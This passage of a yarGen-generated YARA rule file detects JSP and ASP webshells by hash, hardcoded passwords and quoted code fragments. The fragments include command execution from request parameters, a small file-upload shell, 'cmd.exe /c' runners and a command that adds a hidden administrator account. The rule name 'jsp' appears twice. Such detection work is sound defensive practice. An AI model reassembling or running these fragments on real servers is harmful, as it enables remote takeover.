      hash1 = "f7189627975054f5a9b51e103b7a4771971e178e865ddf29445bd104e0f121fe"
   strings:
      $s1 = "String Pwd=\"hkmjj\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule indexop_jsp_ {
   meta:
      description = "webshell - file indexop.jsp..jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "45be2bd8db15a97e482f2fe0b36e1e1b44ba9ce34929f5755cedeafbff6360b2"
   strings:
      $s1 = "String Pwd=\"7495\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule webshell_jsp_edit_ot {
   meta:
      description = "webshell - file edit_ot.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6a844c3cafbf8f2427cf90ce28a27242b1710d2cfb37b8181ce5f9fc3a7a2cdb"
   strings:
      $s1 = "String Pwd=\"xc\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule webshell_jsp_zval {
   meta:
      description = "webshell - file zval.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a5b30ad841ac37b37d34a25036457f80b21692a77ede840c082a7121755a426d"
   strings:
      $s1 = "String Pwd=\"c\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule webshell_jsp_t {
   meta:
      description = "webshell - file t.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0dbc21d0e98041b57fb1f5cbcea35bb00c72c883d4326febb1199c866fa75749"
   strings:
      $s1 = "String Pwd=\"t\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule webshell_jsp_w {
   meta:
      description = "webshell - file w.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64e69b73c3ed42bf910b85c22cbb7a1c8ce5db7f64ff7427362e6c6e740dbe1a"
   strings:
      $s1 = "String Pwd=\"test\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule Customize {
   meta:
      description = "webshell - file Customize.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "37132d9bd0c29634e01cd9a951ef5d09dac1755814e4c55eb22f58a3e47e2719"
   strings:
      $s1 = "String Pwd=\"k8\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule jsp {
   meta:
      description = "webshell - file jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "98f64a05f651abc11845a40fd48e8858c4845031ff196bdbf8260a2cb17af59d"
   strings:
      $x1 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd=\"023\";String cs=\"UTF-8\";String EC(" ascii
      $x2 = "}else{sb.append(r.getObject(i)+\"\"+\"\\t|\\t\");}}if(bw!=null){bw.newLine();}sb.append(\"\\r\\n\");}r.close();if(bw!=null){bw.c" ascii
      $s3 = "g[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select" ascii
      $s4 = "untime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(\"N\")){NN(z1,sb);}else if(Z.equals(\"O\"" ascii
      $s5 = "ws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q" ascii
      $s6 = "(\"L\")){LL(z1,z2);sb.append(\"1\");}else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtim" ascii
      $s7 = "1; i <=n; i++){sb.append(d.getColumnName(i)+\"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file=new File(p" ascii
      $s8 = "atch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeUpdate(q);sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");}c" ascii
      $s9 = "FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInput" ascii
      $s10 = ".indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(in" ascii
      $s11 = "a.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;" ascii
      $s12 = " k=0; k < x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exce" ascii
      $s13 = "Stream(new FileInputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write" ascii
      $s14 = ".append(\"->\"+\"|\");String s=request.getSession().getServletContext().getRealPath(\"/\");if(Z.equals(\"A\")){sb.append(s+\"\\t" ascii
      $s15 = " s)throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim(" ascii
      $s16 = "T,sQ,sF=\"\";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");for(int i=0; i<l.length; i++){d" ascii
      $s17 = "x[4],x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[/null]\")?\"\":x[3]);}else{Connection c=DriverManager" ascii
      $s18 = "split(\"\\r\\n\");Class.forName(x[0].trim());if(x[1].indexOf(\"jdbc:oracle\")!=-1){return DriverManager.getConnection(x[1].trim(" ascii
      $s19 = "exOf(\"-to:\")==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(\"-to:\")" ascii
      $s20 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd=\"023\";String cs=\"UTF-8\";String EC(" ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule jsp {
   meta:
      description = "webshell - file jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b281c745334f6660c888fef83ae615d0fb219d9dddc74eebf8ad0b0682791b3b"
   strings:
      $x1 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd=\"023\";String cs=\"UTF-8\";String EC(" ascii
      $x2 = "substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}e" ascii
      $s3 = "g[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select" ascii
      $s4 = "ws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q" ascii
      $s5 = "1; i <=n; i++){sb.append(d.getColumnName(i)+\"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file=new File(p" ascii
      $s6 = "FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInput" ascii
      $s7 = ".indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(in" ascii
      $s8 = "\"--f:\")!=-1){bw.write(r.getObject(i)+\"\"+\"\\t\");bw.flush();}else{sb.append(r.getObject(i)+\"\"+\"\\t|\\t\");}}if(bw!=null){" ascii
      $s9 = "(\"z1\")+\"\");String z2=EC(request.getParameter(\"z2\")+\"\");sb.append(\"->\"+\"|\");String s=request.getSession().getServletC" ascii
      $s10 = "cs=request.getParameter(\"z0\")!=null?request.getParameter(\"z0\")+\"\":cs;response.setContentType(\"text/html\");response.setCh" ascii
      $s11 = "b.append(\"Execute Successfully!\\t|\\t\\r\\n\");}catch(Exception ee){sb.append(ee.toString()+\"\\t|\\t\\r\\n\");}}m.close();c.c" ascii
      $s12 = "}sb.append(\"\\r\\n\");}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeU" ascii
      $s13 = "a.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;" ascii
      $s14 = " k=0; k < x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exce" ascii
      $s15 = "Stream(new FileInputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write" ascii
      $s16 = " s)throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim(" ascii
      $s17 = "T,sQ,sF=\"\";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");for(int i=0; i<l.length; i++){d" ascii
      $s18 = "x[4],x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[/null]\")?\"\":x[3]);}else{Connection c=DriverManager" ascii
      $s19 = "split(\"\\r\\n\");Class.forName(x[0].trim());if(x[1].indexOf(\"jdbc:oracle\")!=-1){return DriverManager.getConnection(x[1].trim(" ascii
      $s20 = "exOf(\"-to:\")==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(\"-to:\")" ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule JSP {
   meta:
      description = "webshell - file JSP.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bd9f607eb2612a20b7b2ae9bb0f6412abaa0580694fb9020955e97d76bb08fdf"
   strings:
      $s1 = "th(\"/\")+request.getParameter(\"f\"));InputStream is=request.getInputStream();byte[] b=new byte[512];int n;while((n=is.read(b,0" ascii
      $s2 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")!=null){FileOutputStream os=new FileOutputStream(application.getRe" ascii
      $s3 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")!=null){FileOutputStream os=new FileOutputStream(application.getRe" ascii
      $s4 = "))!=-1){os.write(b,0,n);}os.close();is.close();}%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule CaiDao_Webshell_Password_LandGrey {
   meta:
      description = "webshell - file CaiDao-Webshell-Password-LandGrey.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "cf08b15de7c2039464782d7b370a7bf88e0565c0f643a9eb4b994a9ff2fea59b"
   strings:
      $s1 = "<%@page import=\"java.io.*,java.net.*,java.sql.*,java.text.*\"%>" fullword ascii
      $s2 = "\\u0061\\u0070\\u0070\\u0065\\u006e\\u0064\\u0028\\u006c\\u005b\\u0069\\u005d\\u002e\\u0067\\u0065\\u0074\\u004e\\u0061\\u006d" ascii
      $s3 = "\\u0029\\u0075\\u002e\\u006f\\u0070\\u0065\\u006e\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0028" ascii
      $s4 = "\\u002e\\u0061\\u0070\\u0070\\u0065\\u006e\\u0064\\u0028\\u0064\\u002e\\u0067\\u0065\\u0074\\u0043\\u006f\\u006c\\u0075\\u006d" ascii
      $s5 = "\\u0074\\u0028\\u0029\\u003b\\u0066\\u006f\\u0072\\u0028\\u0069\\u003d\\u0031\\u003b\\u0069\\u003c\\u003d\\u006e\\u003b\\u0069" ascii
      $s6 = "\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0029\\u007b\\u0073\\u0062\\u002e\\u0061\\u0070\\u0070" ascii
      $s7 = "\\u0065\\u0028\\u0029\\u003b\\u0063\\u002e\\u0063\\u006c\\u006f\\u0073\\u0065\\u0028\\u0029\\u003b\\u007d\\u0076\\u006f\\u0069" ascii
      $s8 = "\\u002c\\u0063\\u0073\\u0029\\u003b\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0020" ascii
      $s9 = "\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0074\\u0029\\u0074\\u0068\\u0072\\u006f\\u0077\\u0073\\u0020\\u0045\\u0078\\u0063" ascii
      $s10 = "\\u002e\\u0072\\u0065\\u0061\\u0064\\u0028\\u0062\\u002c\\u0030\\u002c\\u0035\\u0031\\u0032\\u0029\\u0029\\u0021\\u003d\\u002d" ascii
      $s11 = "\\u0073\\u0062\\u002e\\u0061\\u0070\\u0070\\u0065\\u006e\\u0064\\u0028\\u0022\\u0045\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065" ascii
      $s12 = "\\u0062\\u0029\\u003b\\u007d\\u0065\\u006c\\u0073\\u0065\\u0020\\u0069\\u0066\\u0028\\u005a\\u002e\\u0065\\u0071\\u0075\\u0061" ascii
      $s13 = "\\u0065\\u0072\\u0065\\u0064\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072\\u0028\\u006e\\u0065\\u0077\\u0020\\u0049\\u006e\\u0070" ascii
      $s14 = "\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u007a\\u0031\\u0022\\u0029\\u002b\\u0022\\u0022\\u002c" ascii
      $s15 = "\\u002e\\u0063\\u006c\\u006f\\u0073\\u0065\\u0028\\u0029\\u003b\\u0069\\u0073\\u002e\\u0063\\u006c\\u006f\\u0073\\u0065\\u0028" ascii
      $s16 = "\\u0066\\u0028\\u005a\\u002e\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073\\u0028\\u0022\\u0041\\u0022\\u0029\\u0029\\u007b\\u0053" ascii
      $s17 = "\\u0069\\u006c\\u0065\\u0028\\u0073\\u0029\\u003b\\u0069\\u0066\\u0028\\u0066\\u002e\\u0069\\u0073\\u0044\\u0069\\u0072\\u0065" ascii
      $s18 = "\\u0065\\u0077\\u0020\\u0062\\u0079\\u0074\\u0065\\u005b\\u0035\\u0031\\u0032\\u005d\\u003b\\u0077\\u0068\\u0069\\u006c\\u0065" ascii
      $s19 = "\\u0070\\u0065\\u006e\\u0064\\u0028\\u0022\\u0031\\u0022\\u0029\\u003b\\u007d\\u0065\\u006c\\u0073\\u0065\\u0020\\u0069\\u0066" ascii
      $s20 = "\\u0068\\u002e\\u0069\\u006e\\u0064\\u0065\\u0078\\u004f\\u0066\\u0028\\u0064\\u002e\\u0063\\u0068\\u0061\\u0072\\u0041\\u0074" ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      8 of them
}

rule webshell_jsp_maint {
   meta:
      description = "webshell - file maint.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "27127178ffdadbfe6cc39c4df3130b3f029f22ed14e721f8f89614e1427a46fd"
   strings:
      $s1 = "String Pwd=\"PW\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule webshell_jsp_ver008 {
   meta:
      description = "webshell - file ver008.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7630bd7c4a9dde3b522ec224373edc1a90b6e926ff97e2b56d5dbc6eb78b25ed"
   strings:
      $s1 = "String Pwd=\"a\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule webshell_jsp_test {
   meta:
      description = "webshell - file test.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7d3cb8a8ff28f82b07f382789247329ad2d7782a72dde9867941f13266310c80"
   strings:
      $x1 = "l; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStre" ascii
      $s2 = "<%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s" ascii
      $s3 = "<%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s" ascii
      $s4 = "1234<%@ page contentType=\"text/html; charset=GBK\" %>" fullword ascii
      $s5 = "out.println(output);%>" fullword ascii
      $s6 = "am())); while((s = sI.readLine()) != null) { output += s +\"\\r\\n\"; } } catch(IOException e) { e.printStackTrace(); } } " fullword ascii
   condition:
      uint16(0) == 0x3231 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule webshell_jsp_ice {
   meta:
      description = "webshell - file ice.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8947bcb8e9b46559b7844800b82792bcb1ebcb3e7bb5f73a620fb0154f6d46f6"
   strings:
      $s1 = "String Pwd=\"ice\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule webshell_jsp_info {
   meta:
      description = "webshell - file info.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "81d326f91848ee3eb808f9040163966b05aafb68eb2834d067ce7eea9d8ed3eb"
   strings:
      $s1 = "String Pwd=\"fuckQ\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule webshell_jsp_guige02 {
   meta:
      description = "webshell - file guige02.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c7137030d9653611f63d82c0dbc8354ae13a1e601bc86e94ca83fd64c28f274"
   strings:
      $s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private String password=\"734303\";//??" fullword ascii
      $s2 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#ffffff\"><%String act=\"\";String path=request.getP" ascii
      $s3 = "ut.println(\"<div align='center'><form action='?act=login' method='post'>\");out.println(\"<input type='password' name='pass'/>" ascii
      $s4 = "login\")){    String pass=request.getParameter(\"pass\");    if(pass.equals(password))    {     session.setAttribute(\"hehe\",\"" ascii
      $s5 = "e(\"hehe\")!=null){if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\")){if (path!=null && !path.equals(\"" ascii
      $s6 = "eter(\"path\");String content=request.getParameter(\"content\");String url=request.getRequestURI();String url2=request.getRealPa" ascii
      $s7 = "equest.getServletPath());try{act=request.getParameter(\"act\").toString();}catch(Exception e){}if(request.getSession().getAttrib" ascii
      $s8 = "ut.println(\"<input type='submit' name='update' class='unnamed1' value='Login' />\");out.println(\"</form></div>\");}if(act.equa" ascii
      $s9 = "e='content' rows=15 cols=50></textarea><br>\");out.println(\"<input type='submit' value='save!'>\");out.println(\"</form>\");}}e" ascii
      $s10 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#ffffff\"><%String act=\"\";String path=request.getP" ascii
      $s11 = "else    {out.println(\"Error\");out.println(\"<a href='javascript:history.go(-1)'><font color='red'>go back</font></a></div><br>" ascii
      $s12 = "   writer.println(content);     writer.close();     if (newfile.exists() && newfile.length()>0)     {       out.println(\"<font " ascii
      $s13 = "ontent!=null && !content.equals(\"\")){   try{     File newfile=new File(path);     PrintWriter writer=new PrintWriter(newfile);" ascii
      $s14 = "ption e)   {     e.printStackTrace();   }}out.println(\"<form action=\"+url+\" method=post>\");out.println(\"<font size=3><br></" ascii
      $s15 = "<input type=text size=54 name='path'><br>\");out.println(\"<font size=3 color=red>\"+url2+\"</font><br>\");out.println(\"<textar" ascii
      $s16 = ";     String uri=request.getRequestURI();        uri=uri.substring(uri.lastIndexOf(\"/\")+1);     response.sendRedirect(uri);   " ascii
   condition:
      uint16(0) == 0x253c and filesize < 6KB and
      8 of them
}

rule index_sys {
   meta:
      description = "webshell - file index_sys.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ddf0b2fb4c9c4799d86a7fd3860f94ba26b4c47084f283b4b84309bdb4f618b7"
   strings:
      $s1 = "GIF98a<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%>" fullword ascii
      $s2 = "<action name=\"activitySupportAdvisory\" class=\"com.founder.web.action.activity.EventAction\"  method=\"supportAdvisory\">" fullword ascii
      $s3 = "<!DOCTYPE struts PUBLIC" fullword ascii
      $s4 = "<result>/WEB-INF/pages/activity/eventDetails.jsp</result>" fullword ascii
      $s5 = "<action name=\"initActivityAdvisory\" class=\"com.founder.web.action.activity.EventAction\"  method=\"initAdvisory\">" fullword ascii
      $s6 = "<action name=\"eventInfo\" class=\"com.founder.web.action.activity.EventAction\">" fullword ascii
      $s7 = "<action name=\"activityAgainstAdvisory\" class=\"com.founder.web.action.activity.EventAction\"  method=\"againstAdvisory\">" fullword ascii
      $s8 = " <action name=\"jsonActivityVote\" class=\"com.founder.web.action.activity.EventAction\" method=\"jsonVote\">" fullword ascii
      $s9 = "<action name=\"activityList\" class=\"com.founder.web.action.activity.EventAction\"  method=\"activityList\">" fullword ascii
      $s10 = "<action name=\"generateVerifyCode\" class=\"com.founder.web.action.activity.EventAction\"" fullword ascii
      $s11 = "<action name=\"activityAdvisory\" class=\"com.founder.web.action.activity.EventAction\"" fullword ascii
      $s12 = "<action name=\"activityInsertGrade\" class=\"com.founder.web.action.activity.EventAction\"  method=\"insertGrade\">" fullword ascii
      $s13 = "<action name=\"initActivityVoteResult\" class=\"com.founder.web.action.activity.EventAction\"  method=\"initVoteResult\">" fullword ascii
      $s14 = "<action name=\"join\" class=\"com.founder.web.action.activity.EventAction\"" fullword ascii
      $s15 = "        \"http://struts.apache.org/dtds/struts-2.0.dtd\">" fullword ascii
      $s16 = "    <result name=\"input\">/WEB-INF/pages/common/404.jsp</result>" fullword ascii
      $s17 = "<result type=\"json\"></result>" fullword ascii
      $s18 = "method=\"join\">" fullword ascii
      $s19 = "method=\"activityAdvisory\">" fullword ascii
      $s20 = "<package name=\"activity\" extends=\"momoko-front\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule cmd_asp_5_1 {
   meta:
      description = "webshell - file cmd-asp-5.1.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bd86d29f51116c5ac28188d680fc5b2b70d72ed97dd5567d8d0bf2a17b888dbe"
   strings:
      $x1 = "  Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword ascii
      $x2 = "  Call oS.Run(\"win.com cmd.exe /c cacls.exe \" & szTF & \" /E /G" fullword ascii
      $x3 = "  Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword ascii
      $s4 = "  szTF = \"c:\\windows\\pchealth\\ERRORREP\\QHEADLES\\\" &  oFSys.GetTempName()" fullword ascii
      $s5 = "<!--    http://michaeldaw.org   2006    -->" fullword ascii
      $s6 = "' ASP Cmd Shell On IIS 5.1" fullword ascii
      $s7 = "' brett.moore_at_security-assessment.com " fullword ascii
      $s8 = "Set oS = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
      $s9 = "  ' Here we do the command" fullword ascii
      $s10 = "Machine: <%=oSNet.ComputerName%><BR>" fullword ascii
      $s11 = "Set oSNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
      $s12 = "Set oFSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s13 = "' http://seclists.org/bugtraq/2006/Dec/0226.html" fullword ascii
      $s14 = "<FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\">" fullword ascii
      $s15 = "If (szCMD <> \"\") Then" fullword ascii
      $s16 = "<input type=submit value=\"Run\"></FORM><PRE>" fullword ascii
      $s17 = "  Response.Write Server.HTMLEncode(oF.ReadAll)" fullword ascii
      $s18 = "<input type=text name=\"C\" size=70 value=\"<%= szCMD %>\">" fullword ascii
      $s19 = "Username: <%=oSNet.UserName%><br>" fullword ascii
      $s20 = "Dim oS,oSNet,oFSys, oF,szCMD, szTF" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_wt {
   meta:
      description = "webshell - file wt.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b3d59d237cf654294c4be9c4887da8c43c5ad0bef70deeea9aa424f890135cb7"
   strings:
      $s1 = "Paths_str=\"c:\\windows\\\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\\"&chr(13)&chr(10)&\"c:\\Program Files\\\"" fullword ascii
      $s2 = "Server.ScriptTimeOut=999999999" fullword ascii
      $s3 = "filepath = GetFullPath(DirStr)&fso.GettempName" fullword ascii
      $s4 = "Response.Write \"<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' checked='checked' />\"" fullword ascii
      $s5 = "Response.Write \"<label for='NoCheckTemp'>\"" fullword ascii
      $s6 = "Response.Write \"<form id='form1' name='form1' method='post' action=''>\"" fullword ascii
      $s7 = "NoCheckTemp = (Request(\"NoCheckTemp\")=\"on\")" fullword ascii
      $s8 = "if (CheckNextDir=True) and (IS_TEMP_DIR=false) then '" fullword ascii
      $s9 = "  IS_TEMP_DIR =" fullword ascii
      $s10 = "</font>]\"&DirStr&\" [<font color=red>\"&Err.Description&\"</font>]<br>\"" fullword ascii
      $s11 = "if Right(path,1) <> \"\\\" then GetFullPath = path&\"\\\" '" fullword ascii
      $s12 = "Path = GetFullPath(Path) '" fullword ascii
      $s13 = "Response.Write \"</label>\"" fullword ascii
      $s14 = "response.Flush" fullword ascii
      $s15 = "Response.Write \"<input type='submit' name='button' value='" fullword ascii
      $s16 = "Response.Write \"[<font color=red>" fullword ascii
      $s17 = "Response.Write \"<input name='CheckNextDir' type='checkbox' id='CheckNextDir' checked='checked' />" fullword ascii
      $s18 = "Response.Buffer = True" fullword ascii
      $s19 = "Response.Write \"<input name='ShowNoWrite' type='checkbox' id='ShowNoWrite'/>\"" fullword ascii
      $s20 = "Response.Write \"<label for='ShowNoWrite'>\"" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule asp__1_ {
   meta:
      description = "webshell - file asp (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
   strings:
      $x1 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
      $s2 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
      $s3 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
      $s4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
      $s5 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s7 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s9 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
      $s10 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
      $s11 = " Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targ" ascii
      $s12 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>" fullword ascii
      $s13 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
      $s14 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
      $s15 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
      $s16 = "name&\"</a><hr><FORM Action='\"&URL&\"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login" ascii
